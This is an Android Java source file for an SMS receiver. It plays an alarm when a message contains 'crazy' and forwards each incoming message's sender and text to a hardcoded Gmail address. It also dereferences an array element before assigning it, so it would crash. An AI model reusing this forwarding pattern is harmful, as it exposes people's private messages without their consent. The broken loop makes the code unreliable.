package criar.SMSReceiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.telephony.SmsMessage;
import criar.SMSReceiver.audio.Player;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getSerializableExtra("pdus");
        SmsMessage[] msgs = null;
        if (pdus != null) {
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
            	System.out.println(msgs[i].toString());
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                if (msgs[i].getMessageBody().toLowerCase().contains("crazy")) {
                    receiverCrazy(context);
                }
                enviarEmail(context, msgs[i]);
            }
        }
    }

    private void receiverCrazy(Context context) {
        try {
            Player.tocarAlarme(context, Player.TYPE_AVALIABLE, true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void enviarEmail(Context context, SmsMessage msg) {
        Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);

        emailIntent.setType("plain/text");

        emailIntent.putExtra(android.content.Intent.EXTRA_EMAIL, new String[]{"gbzarelli@gmail.com"});

        emailIntent.putExtra(android.content.Intent.EXTRA_SUBJECT, msg.getOriginatingAddress());

        emailIntent.putExtra(android.content.Intent.EXTRA_TEXT, msg.getMessageBody());

        emailIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        context.startActivity(emailIntent);

    }
    
}
